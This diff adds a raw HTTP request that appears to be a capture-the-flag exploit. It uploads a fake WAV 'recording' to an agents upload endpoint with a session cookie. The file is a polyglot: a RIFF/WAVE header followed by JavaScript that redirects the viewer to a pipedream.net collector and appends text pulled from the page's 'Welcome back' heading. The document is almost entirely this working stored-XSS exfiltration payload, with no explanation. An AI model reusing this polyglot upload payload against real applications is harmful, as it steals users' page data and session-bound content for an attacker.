@@ -1,0 +1,27 @@
+POST /agents/upload/8bd97c9a-8fb9-4a75-8453-0f1bf8e57c11/45a09928-e876-43d4-bafa-a4d1e05241c6 HTTP/1.1
+Host: 45.122.249.68:20014
+Cache-Control: max-age=0
+sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: connect.sid=s%3ANO1xTkwKfI4vFSGCdulzPr7ROCM-7o7d.LCCq49YE4UoZWyTiIewoQchgWR4SJeeuAXGj6R5T9ac
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo9EPr8Rd3e7Qb1rH
+Content-Length: 335
+
+------WebKitFormBoundaryo9EPr8Rd3e7Qb1rH
+Content-Disposition: form-data; name="recording"; filename="kietTinder.wav"
+Content-Type:audio/wave
+
+var a = "RIFF@@@@WAVE";
+location.href="https://eon5wu9esj2rcgn.m.pipedream.net/?flag="+document.getElementsByTagName("h2")[0].innerText.split("Welcome back ")[1];
+------WebKitFormBoundaryo9EPr8Rd3e7Qb1rH--
